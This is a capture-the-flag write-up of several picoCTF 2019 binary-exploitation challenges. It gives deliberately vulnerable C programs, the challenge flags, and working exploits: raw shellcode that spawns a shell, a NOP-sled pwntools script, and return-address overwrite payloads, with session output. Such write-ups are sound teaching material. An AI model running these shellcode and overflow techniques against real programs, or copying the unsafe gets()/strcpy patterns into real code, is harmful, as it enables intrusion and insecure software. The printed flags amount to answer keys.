# Binary Exploit

### handy-shellcode (50 points)

This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in `/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5` on the shell server.

FLAG: `picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

Find a shellcode to execute `/bin/bash` online:

```
\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80
```

Use python2 to print it and pipe it to the vulnerable program. python3 has a different version of print statement, which removes some "unprintable" characters from the output. That would ruin the shellcode.

**Note:** We can use `cat` to keep the input stream open!

```bash
$ (python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ; cat) | ./vuln
```

We get the following result:

```bash
$ /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5$ (python -c "print('\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80')" ; cat) | ./vuln
Enter your shellcode:
j
 X�Rfh-p��Rjhh/bash/bin��RQS��̀
Thanks! Executing now...
id
uid=29614(sophiasp1r0) gid=8870(handy-shellcode_1) groups=8870(handy-shellcode_1),1002(competitors),29615(sophiasp1r0)
cat flag.txt
picoCTF{h4ndY_d4ndY_sh311c0d3_2cb0ff39}exit

```

Same effect can be achieve using the following command:

```bash
$ (echo -n -e '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80' ; cat) | ./vuln
```

or use `pwn.asm(pwn.shellcraft.linux.sh())` (See [this link](https://www.youtube.com/watch?v=Nn0fUJuQEsk&t=174s))

### practice-run-1 (50 points)

You're going to need to know how to run programs if you're going to get out of here. Navigate to `/problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e` on the shell server and run this program to receive a flag.

FLAG: `picoCTF{g3t_r3adY_2_r3v3r53}`

```bash
$ /problems/practice-run-1_0_62b61488e896645ebff9b6c97d0e775e/run_this
# => picoCTF{g3t_r3adY_2_r3v3r53}
```

### Overflow 0 (100 points)

This should be easy. Overflow the correct buffer in this program and get a flag. Its also found in `/problems/overflow-0_5_db665826dabb99c44758c97abfd8c4c6` on the shell server.

FLAG: `picoCTF{3asY_P3a5y4a888b8e}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}

```

Overflow the buffer to trigger segmentation fault, and the program will print out the flag.

```bash
$ python -c "print('A' * 140)" | xargs ./vuln
# => picoCTF{3asY_P3a5y4a888b8e}
```

### Overflow 1 (150 points)

You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program? You can find it in `/problems/overflow-1_1_e792baa0d29d24699530e6a26071a260` on the shell server.

FLAG: `picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

Using gdb we can figure out that the buffer starts at `0xffffd6c0` and ends at `0xffffd700`. However, `ebp` for `vuln` is `0xffffd708`. That means, there are 8 bytes between the end of the buffer and the start of the saved frame pointer. The return address should be at `0xffffd70c`.

That means, we need to pass in a string of 72 bytes to overwrite the return address and make `vuln` return to `flag`. The address of `flag` is `0x080485e6`.

Therefore, we can use the following command:

```bash
$ ruby -e 'print("A" * 76 + "\xe6\x85\x04\x08");' | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}Segmentation fault (core dumped)
```

### slippery-shellcode (200 points)

This program is a little bit more tricky. Can you spawn a shell and use that to read the `flag.txt`? You can find the program in `/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8` on the shell server. Source.

FLAG: `picoCTF{sl1pp3ry_sh311c0d3_de21cb07}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 512
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing from a random location now...");

  int offset = (rand() % 256) + 1;
  
  ((void (*)())(buf+offset))();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}

```

The idea is just to add `NOP`s at the beginning of the buffer to make the execution slip down to the shellcode. Based on the random value generated, we have to make sure that the shellcode is located at least 256 bytes away from the beginning of the buffer.

Therefore, we can create the following script to get the flag.

```python
#!/usr/bin/env python2
  
from pwn import *

p = process('/problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8/vuln')

p.recv()

payload = '\x90' * 300 + asm(shellcraft.i386.linux.sh());

p.sendline(payload)

p.interactive()
```

Once we will get a shell prompt, we can use the following commands to get the flag:

```bash
[*] Switching to interactive mode
\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90jhh///sh/bin\x89�h\x814$ri1�Qj\x04Y�Q��1�j\x0bX̀
Thanks! Executing from a random location now...
$ pwd
/home/sophiasp1r0
$ cd /problems/slippery-shellcode_3_68613021756bf004b625d7b414243cd8
$ ls
flag.txt  vuln    vuln.c
$ cat flag.txt
picoCTF{sl1pp3ry_sh311c0d3_de21cb07}
```

### OverFlow 2 (250 points)

Now try overwriting arguments. Can you get the flag from this program? You can find it in `/problems/overflow-2_1_210f23786438d7f7e527f4901367a74b` on the shell server. Source.

FLAG: `picoCTF{arg5_and_r3turn5001d1db0}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 176
#define FLAGSIZE 64

void flag(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xC0DED00D)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}

```

Overwrite the return address of `vuln` to be the address of `flag` using the buffer overflow. Remember that once the program jumps to `flag`, it would assume `esp` is pointing to its return address. Hence, we have to add 4 bytes of junk data after the return address of `vuln` and then put two 4-byte argument after that.

Using gdb, we can know that the address of `flag` is `0x080485e6`, the address of the buffer in `vuln` is `0xffb1f740`, the return address is at `9xffb1f7fc`. Hence, we have to create a payload of `188 (0xffb1f7fc - 0xffb1f740) + 4 (address of flag) + 4 (junk data that flag regards as its return address) + 2 * 4 (arguments) = 204` bytes. Having that in mind, we can use the following command:

```bash
$ python -c 'print("A" * 188 + "\xe6\x85\x04\x08" + "A" * 4 + "\xEF\xBE\xAD\xDE" + "\x0D\xD0\xDE\xC0")' | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAﾭ�
picoCTF{arg5_and_r3turn5001d1db0}Segmentation fault (core dumped)
```

### NewOverFlow-1 (200 points)

Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program. You can find it in `/problems/newoverflow-1_1_39d472170ee5080cac1226374a7101a7` on the shell server. Source.

FLAG: `picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_1a8eb93a}`

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Welcome to 64-bit. Give me a string that gets you the flag: ");
  vuln();
  return 0;
}

```

The whole idea is the same as the previous exploit. However, this time, if we directly overwrite the address of `vuln` and do nothing else, we will get a segmentation fault. The reason for that is `printf` fails to execute instruction `movaps`.

```text
   $rsp   : 0x00007ffda0c16528  →  0x0000000000000000
...
   0x7f32ef45065c <buffered_vfprintf+140> punpcklqdq xmm0, xmm0
   0x7f32ef450660 <buffered_vfprintf+144> mov    DWORD PTR [rsp+0xa4], eax
   0x7f32ef450667 <buffered_vfprintf+151> lea    rax, [rip+0x3890f2]        # 0x7f32ef7d9760 <_IO_helper_jumps>
 → 0x7f32ef45066e <buffered_vfprintf+158> movaps XMMWORD PTR [rsp+0x50], xmm0
   0x7f32ef450673 <buffered_vfprintf+163> mov    QWORD PTR [rsp+0x108], rax
   0x7f32ef45067b <buffered_vfprintf+171> call   0x7f32ef44d390 <_IO_vfprintf_internal>
   0x7f32ef450680 <buffered_vfprintf+176> mov    r12d, eax
   0x7f32ef450683 <buffered_vfprintf+179> mov    r13d, DWORD PTR [rip+0x39225e]        # 0x7f32ef7e28e8 <__libc_pthread_functions_init>
   0x7f32ef45068a <buffered_vfprintf+186> test   r13d, r13d
```

According to Google, "When the source or destination operand is a memory operand, the operand must be aligned on a 16-byte boundary or a general-protection exception (#GP) is generated." In other words, the program crashed because `rsp+0x50` which equals `0x7ffda0c16578` is not a multiple of 16. To fix this problem, we can shift the stack by 8 bytes through calling any other function before the `flag` function. We can do this by calling `main`. Hence, we can construct the following exploit.

```python
from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
    gdb.attach(sh)


if DEBUG:
    context.log_level = 'debug'

if len(argv) < 2:
    stdout = process.PTY
    stdin = process.PTY

    sh = process(BINARY, stdout=stdout, stdin=stdin)

    if DEBUG:
        attach_gdb()

    REMOTE = False
else:
    s = ssh(host='2019shell1.picoctf.com', user='<username>', password="<password>")
    sh = s.process('vuln', cwd='/problems/newoverflow-1_0_f9bdea7a6553786707a6d560decc5d50')
    REMOTE = True


flag_addr = 0x00400767
main_addr = 0x004007e8
payload = 'a' * (0x40 + 8) + p64(main_addr) + p64(flag_addr)

sh.sendlineafter(': ', payload)
sh.sendlineafter(': ', 'a')
sh.interactive()

```

Once we run this, we get:

```text
[+] Starting remote process execve('vuln', ['vuln'], os.environ) on 2019shell1.picoctf.com: pid 4036890
[DEBUG] Received 0x9e bytes:
    00000000  31 0a 34 30  33 36 38 39  30 0a 32 39  36 31 34 0a  │1·40│3689│0·29│614·│
    00000010  32 39 36 31  35 0a 32 39  36 31 34 0a  38 37 36 32  │2961│5·29│614·│8762│
    00000020  0a 2f 70 72  6f 62 6c 65  6d 73 2f 6e  65 77 6f 76  │·/pr│oble│ms/n│ewov│
    00000030  65 72 66 6c  6f 77 2d 31  5f 30 5f 66  39 62 64 65  │erfl│ow-1│_0_f│9bde│
    00000040  61 37 61 36  35 35 33 37  38 36 37 30  37 61 36 64  │a7a6│5537│8670│7a6d│
    00000050  35 36 30 64  65 63 63 35  64 35 30 2f  76 75 6c 6e  │560d│ecc5│d50/│vuln│
    00000060  00 57 65 6c  63 6f 6d 65  20 74 6f 20  36 34 2d 62  │·Wel│come│ to │64-b│
    00000070  69 74 2e 20  47 69 76 65  20 6d 65 20  61 20 73 74  │it. │Give│ me │a st│
    00000080  72 69 6e 67  20 74 68 61  74 20 67 65  74 73 20 79  │ring│ tha│t ge│ts y│
    00000090  6f 75 20 74  68 65 20 66  6c 61 67 3a  20 0a        │ou t│he f│lag:│ ·│
    0000009e
[DEBUG] Sent 0x59 bytes:
    00000000  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000040  61 61 61 61  61 61 61 61  e8 07 40 00  00 00 00 00  │aaaa│aaaa│··@·│····│
    00000050  67 07 40 00  00 00 00 00  0a                        │g·@·│····│·│
    00000059
[DEBUG] Received 0x3d bytes:
    'Welcome to 64-bit. Give me a string that gets you the flag: \n'
[DEBUG] Sent 0x2 bytes:
    'a\n'
[*] Switching to interactive mode

[DEBUG] Received 0x32 bytes:
    'picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_1a8eb93a}\n'
picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_1a8eb93a}
[*] Got EOF while reading in interactive

```
